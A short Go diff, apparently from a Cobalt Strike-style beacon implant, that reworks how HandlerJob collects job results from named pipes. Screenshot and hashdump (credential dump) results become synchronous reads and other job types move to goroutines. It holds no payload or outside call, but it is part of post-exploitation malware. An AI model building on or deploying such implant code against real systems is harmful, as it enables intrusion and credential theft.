@@ -306,26 +306,35 @@ func HandlerJob(b []byte) ([]byte, error) {
 
 	time.Sleep(time.Second)
 
-	if callbackType == CALLBACK_SCREENSHOT {
-		result, err := ReadNamedPipeAll(pipeName)
-
-		if result != "" {
-			DataProcess(callbackType, []byte(result[4:]))
-		} else {
-			ErrorProcess(errors.New("result error"))
-		}
-
-		if err != nil {
-			return nil, err
-		}
-		return []byte("Job success"), nil
+	if callbackType != CALLBACK_OUTPUT_UTF8 && callbackType != CALLBACK_SCREENSHOT && callbackType != CALLBACK_HASHDUMP {
+		go func() {
+			result, err := ReadNamedPipe(pipeName, callbackType, sleepTime)
+			if err != nil {
+				ErrorProcess(err)
+				return
+			}
+			DataProcess(callbackType, []byte(result))
+			DataProcess(0, []byte("Job success"))
+		}()
+		return []byte("Hold on"), nil
 	}
 
-	jobWithCallback(pipeName, callbackType, sleepTime, func(result []byte) {
-		DataProcess(callbackType, result)
-	})
+	result, err := ReadNamedPipeAll(pipeName)
 
-	return []byte("Hold on"), nil
+	if result != "" {
+		if callbackType == CALLBACK_SCREENSHOT {
+			DataProcess(callbackType, []byte(result[4:]))
+		} else {
+			DataProcess(callbackType, []byte(result))
+		}
+	} else {
+		ErrorProcess(errors.New("result error"))
+	}
+
+	if err != nil {
+		return nil, err
+	}
+	return []byte("Job success"), nil
 }
 
 func ReadNamedPipe(pipeName []byte, callbackType int, sleepTime uint16) (string, error) {
@@ -374,15 +383,4 @@ func ReadNamedPipeAll(pipeName []byte) (string, error) {
 		result += string(buf[:n])
 	}
 	return result, nil
-}
-
-func jobWithCallback(pipeName []byte, callbackType int, sleepTime uint16, callback func(result []byte)) {
-	go func() {
-		result, err := ReadNamedPipe(pipeName, callbackType, sleepTime)
-		if err != nil {
-			ErrorProcess(err)
-			return
-		}
-		callback([]byte(result))
-	}()
 }
